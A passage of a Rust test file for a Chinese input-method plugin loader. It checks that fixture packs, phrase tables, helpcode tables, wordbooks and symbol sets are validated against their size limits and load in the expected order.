        "wordbook-long-word",
        "words.tsv 第 1 行的单词或释义为空，或者某一列太长、含有控制字符",
    ),
    ("wordbook-missing-file", "缺少数据文件 words.tsv"),
    ("wordbook-name-too-long", "单词本的 name 不能超过 64 个字符"),
    ("wordbook-one-column", "words.tsv 第 1 行必须是「单词"),
    ("wordbook-only-comments", "words.tsv 里没有任何单词"),
    ("wordbook-txt-extension", "words.txt 的扩展名必须是 .tsv"),
    ("wordbook-unknown-key", "wordbook 里有未知的键 format"),
    ("wordbook-wrong-extension", "words.csv 的扩展名必须是 .tsv"),
];

/// `group` 下的 fixture，按名字排序。
fn fixture_cases(group: &str) -> Vec<(String, PathBuf)> {
    let mut cases: Vec<_> = fs::read_dir(fixture_packs().join(group))
        .unwrap()
        .map(|entry| {
            let entry = entry.unwrap();
            (entry.file_name().into_string().unwrap(), entry.path())
        })
        .collect();
    cases.sort();
    cases
}

#[test]
fn shared_fixture_packs_are_accepted_and_refused_as_listed() {
    for (case, path) in fixture_cases("valid") {
        let summary = validate(&path).unwrap_or_else(|error| panic!("{case}: {error}"));
        let kind = case.split_once('-').unwrap().0;
        assert_eq!(summary.kind().as_str(), kind, "{case}");
    }
    let invalid = fixture_cases("invalid");
    let mut report = String::new();
    for (case, path) in &invalid {
        let actual = match validate(path) {
            Err(PluginError::Invalid(actual)) => actual,
            other => format!("NOT REFUSED AS INVALID: {other:?}"),
        };
        report.push_str(&format!("    (\"{case}\", \"{actual}\"),\n"));
    }
    let names: Vec<&str> = invalid.iter().map(|(case, _)| case.as_str()).collect();
    let listed: Vec<&str> = FIXTURE_REFUSALS.iter().map(|(case, _)| *case).collect();
    assert_eq!(
        names, listed,
        "每个 invalid fixture 都要在 FIXTURE_REFUSALS 里写明原因：\n{report}"
    );
    for (case, path) in &invalid {
        let reason = FIXTURE_REFUSALS
            .iter()
            .find(|(listed, _)| listed == case)
            .unwrap()
            .1;
        match validate(path) {
            Err(PluginError::Invalid(actual)) => {
                assert!(actual.contains(reason), "{case}: {actual}")
            }
            other => panic!("{case}: {other:?}"),
        }
    }
}

#[test]
fn phrase_tables_hold_bounded_rows_and_merge_in_priority_order() {
    let root = tempdir().unwrap();
    let install = |id: &str, rows: &str| {
        let pack = kind_directory(root.path(), PluginKind::PhraseTable).join(id);
        fs::create_dir_all(&pack).unwrap();
        fs::write(
            pack.join(MANIFEST_FILE),
            format!("schema_version = 1\nkind = 'phrase_table'\nid = '{id}'\nname = '短语'\nversion = '1'\nlicense = 'CC0-1.0'\n{rows}"),
        )
        .unwrap();
    };
    let row = |key: &str, text: &str| format!("[[phrases]]\nkey = '{key}'\ntext = '{text}'\n");
    install("office", &(row("dh", "电话") + &row("yx", "邮箱")));
    install("home", &(row("dh", "电话") + &row("dz", "地址")));
    // 2000 行可以，2001 行不行。
    let many = |count: usize| {
        (0..count)
            .map(|index| row("zz", &index.to_string()))
            .collect::<String>()
    };
    install("full", &many(phrase_table::MAX_PHRASES));
    install("over", &many(phrase_table::MAX_PHRASES + 1));
    assert!(load_package(root.path(), None, PluginKind::PhraseTable, "full").is_ok());
    assert_eq!(
        reason(root.path(), PluginKind::PhraseTable, "over"),
        "短语表的条数不在允许范围内"
    );

    let rows: Vec<_> = phrase_table::enabled_phrases(
        root.path(),
        &["home".into(), "missing".into(), "office".into()],
    )
    .into_iter()
    .map(|row| (row.key, row.text))
    .collect();
    assert_eq!(
        rows,
        [
            ("dh".to_owned(), "电话".to_owned()),
            ("dz".to_owned(), "地址".to_owned()),
            ("dh".to_owned(), "电话".to_owned()),
            ("yx".to_owned(), "邮箱".to_owned()),
        ]
    );
    let summary = load_package(root.path(), None, PluginKind::PhraseTable, "office").unwrap();
    let json = serde_json::to_value(&summary).unwrap();
    assert_eq!(json["kind"], "phrase_table");
    assert_eq!(json["phrases"][1]["text"], "邮箱");
}

fn installed_helpcode(root: &Path, id: &str, table: &[u8]) -> PathBuf {
    let pack = kind_directory(root, PluginKind::Helpcode).join(id);
    fs::create_dir_all(&pack).unwrap();
    fs::write(
        pack.join(MANIFEST_FILE),
        format!("schema_version = 1\nkind = 'helpcode'\nid = '{id}'\nname = '部首码'\nversion = '1'\nlicense = 'CC0-1.0'\n[helpcode]\ntable = 'table.txt'\n"),
    )
    .unwrap();
    fs::write(pack.join("table.txt"), table).unwrap();
    pack
}

/// 从 U+4E00 起连续 `count` 个汉字，每个一条 `字=码`。
fn helpcode_lines(count: u32) -> Vec<u8> {
    (0..count)
        .map(|index| format!("{}=ab\n", char::from_u32(0x4E00 + index).unwrap()))
        .collect::<String>()
        .into_bytes()
}

#[test]
fn helpcode_tables_are_bounded_and_load_as_codes() {
    let root = tempdir().unwrap();
    installed_helpcode(root.path(), "full", &helpcode_lines(30_000));
    installed_helpcode(root.path(), "over", &helpcode_lines(30_001));
    let full = load_package(root.path(), None, PluginKind::Helpcode, "full").unwrap();
    let json = serde_json::to_value(&full).unwrap();
    assert_eq!(json["kind"], "helpcode");
    assert_eq!(json["table"], "table.txt");
    assert_eq!(json["entries"], 30_000);
    assert_eq!(
        json["preview"].as_array().unwrap().len(),
        helpcode_pack::PREVIEW_ENTRIES
    );
    assert_eq!(
        json["preview"][0],
        serde_json::json!({"character": "一", "code": "ab"})
    );
    assert_eq!(
        reason(root.path(), PluginKind::Helpcode, "over"),
        "table.txt 的条数超过 30000"
    );

    // 1 MiB 以内可以，多一个字节就不行。
    let mut large = b"# ".to_vec();
    large.resize(helpcode_pack::MAX_TABLE_BYTES as usize - 6, b'x');
    large.extend_from_slice("\n啊=a".as_bytes());
    assert_eq!(large.len() as u64, helpcode_pack::MAX_TABLE_BYTES);
    installed_helpcode(root.path(), "large", &large);
    assert!(load_package(root.path(), None, PluginKind::Helpcode, "large").is_ok());
    large.push(b'\n');
    installed_helpcode(root.path(), "larger", &large);
    assert_eq!(
        reason(root.path(), PluginKind::Helpcode, "larger"),
        "table.txt 为空或太大"
    );

    installed_helpcode(
        root.path(),
        "small",
        "\u{FEFF}# 注释\r\n你=ni\r\n好=h\r\n".as_bytes(),
    );
    let codes = helpcode_pack::load_codes(root.path(), "small").unwrap();
    assert_eq!(codes.len(), 2);
    assert_eq!(codes["你"], "ni");
    assert_eq!(codes["好"], "h");
    assert!(helpcode_pack::load_codes(root.path(), "missing").is_err());
}

fn installed_wordbook(root: &Path, id: &str, words: &[u8]) {
    let pack = kind_directory(root, PluginKind::Wordbook).join(id);
    fs::create_dir_all(&pack).unwrap();
    fs::write(
        pack.join(MANIFEST_FILE),
        format!("schema_version = 1\nkind = 'wordbook'\nid = '{id}'\nname = '词汇'\nversion = '1'\nlicense = 'CC0-1.0'\n[wordbook]\nfile = 'words.tsv'\n"),
    )
    .unwrap();
    fs::write(pack.join("words.tsv"), words).unwrap();
}

#[test]
fn wordbooks_are_bounded_and_load_as_books() {
    let root = tempdir().unwrap();
    let words = |count: usize| {
        (0..count)
            .map(|index| format!("w{index}\tn. 词{index}\n"))
            .collect::<String>()
            .into_bytes()
    };
    installed_wordbook(root.path(), "full", &words(20_000));
    installed_wordbook(root.path(), "over", &words(20_001));
    let full = load_package(root.path(), None, PluginKind::Wordbook, "full").unwrap();
    let json = serde_json::to_value(&full).unwrap();
    assert_eq!(json["kind"], "wordbook");
    assert_eq!(json["word_count"], 20_000);
    assert_eq!(
        json["first_words"],
        serde_json::json!(["w0", "w1", "w2", "w3", "w4"])
    );
    assert_eq!(
        reason(root.path(), PluginKind::Wordbook, "over"),
        "words.tsv 的单词数超过 20000"
    );

    // 4 MiB 以内可以，多一个字节就不行。
    let mut large = b"#".to_vec();
    large.resize(wordbook_pack::MAX_FILE_BYTES as usize - 8, b'x');
    large.extend_from_slice(b"\nab\tn. c");
    assert_eq!(large.len() as u64, wordbook_pack::MAX_FILE_BYTES);
    installed_wordbook(root.path(), "large", &large);
    assert!(load_package(root.path(), None, PluginKind::Wordbook, "large").is_ok());
    large.push(b'\n');
    installed_wordbook(root.path(), "larger", &large);
    assert_eq!(
        reason(root.path(), PluginKind::Wordbook, "larger"),
        "words.tsv 为空或太大"
    );

    let book = wordbook_pack::load_book(root.path(), "pack-full").unwrap();
    assert_eq!(book.id, "pack-full");
    assert!(book.is_valid());
    assert!(wordbook_pack::load_book(root.path(), "pack-missing").is_none());
    assert!(wordbook_pack::load_book(root.path(), "full").is_none());
}

#[test]
fn symbol_sets_list_their_groups_by_pack_name_in_manifest_order() {
    let root = tempdir().unwrap();
    let install = |id: &str, name: &str, groups: &str| {
        let pack = kind_directory(root.path(), PluginKind::SymbolSet).join(id);
        fs::create_dir_all(&pack).unwrap();
        fs::write(
            pack.join(MANIFEST_FILE),
            format!("schema_version = 1\nkind = 'symbol_set'\nid = '{id}'\nname = '{name}'\nversion = '1'\nlicense = 'CC0-1.0'\n{groups}"),
        )
        .unwrap();
    };
    install(
        "math",
        "数学",
        "[[groups]]\ntab = 'symbols'\ntitle = '运算'\nitems = ['±', '×']\n[[groups]]\ntab = 'kaomoji'\ntitle = '算不出'\nkeywords = 'suan'\nitems = ['(・_・;)']\n",
    );
    install(
        "arrows",
        "箭头",
        "[[groups]]\ntab = 'symbols'\ntitle = '箭头'\nitems = ['→']\n",
    );
    install(
        "broken",
        "坏的",
        "[[groups]]\ntab = 'emoji'\ntitle = 'x'\nitems = ['x']\n",
    );
    let groups = symbol_set::plugin_symbol_groups(root.path());
    let listed: Vec<_> = groups
        .iter()
        .map(|group| {
            (
                group.pack.as_str(),
                group.tab.as_str(),
                group.title.as_str(),
            )
        })
        .collect();
    // 包按名字排序（「数学」在「箭头」之前），组按清单顺序；载不入的包不贡献组。
    assert_eq!(
        listed,
        [
            ("math", "symbols", "运算"),
            ("math", "kaomoji", "算不出"),
            ("arrows", "symbols", "箭头"),
        ]
    );
    assert_eq!(groups[1].keywords, "suan");
    assert_eq!(groups[0].keywords, "");
    let summary = load_package(root.path(), None, PluginKind::SymbolSet, "math").unwrap();
    let json = serde_json::to_value(&summary).unwrap();
    assert_eq!(json["kind"], "symbol_set");
    assert_eq!(json["groups"][1]["tab"], "kaomoji");
}
